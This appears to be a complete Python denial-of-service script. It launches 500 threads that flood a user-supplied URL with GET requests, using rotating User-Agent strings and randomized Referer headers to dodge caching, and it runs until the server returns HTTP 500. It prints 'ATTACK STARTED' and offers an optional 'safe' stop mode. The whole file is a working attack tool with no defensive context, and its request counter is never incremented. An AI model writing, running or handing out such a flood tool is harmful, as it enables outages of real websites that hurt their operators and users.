import urllib3
import threading
import random
import string
import time
import re
import sys

# Global params
url = ''
host = ''
request_counter = 0
flag = 0
safe = 0

def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val

# Builds random ASCII string
def buildblock(size):
    out_str = ''
    for i in range(0, size):
        a = random.choice(string.ascii_lowercase)
        out_str += a
    return out_str

def httpcall(url):
    http = urllib3.PoolManager()
    headers = {
        'User-Agent': random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36']),
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer': 'https://www.google.com/?q=' + buildblock(random.randint(5,10)),
        'Keep-Alive': str(random.randint(110,120)),
        'Connection': 'keep-alive',
        'Host': host
    }
    response = http.request('GET', url, headers=headers)
    if response.status == 500:
        set_flag(1)
        print('ATTACK SEND 💥')
    return response.status

# HTTP caller thread 
class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if code == 500 and safe == 1:
                    set_flag(2)
        except Exception as ex:
            pass

# Monitors HTTP threads and counts requests
class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if previous + 100 < request_counter and previous != request_counter:
                print("%d Request SEND " % request_counter)
                previous = request_counter
        if flag == 2:
            print("\nATTACK STOPPED")

# Execute 
if len(sys.argv) < 2:
    print("Usage: python script_name.py <target_url> [safe]")
    sys.exit()
else:
    if sys.argv[1] == "help":
        print("Usage: python script_name.py <target_url> [safe]")
        sys.exit()
    else:
        print("ATTACK STARTED ☄️")
        if len(sys.argv) == 3 and sys.argv[2] == "safe":
            safe = 1
        url = sys.argv[1]
        if url.count("/") == 2:
            url = url + "/"
        m = re.search('(https?\://)?([^/]*)/?.*', url)
        host = m.group(2)
        for i in range(500):
            t = HTTPThread()
            t.start()
        t = MonitorThread()
        t.start()
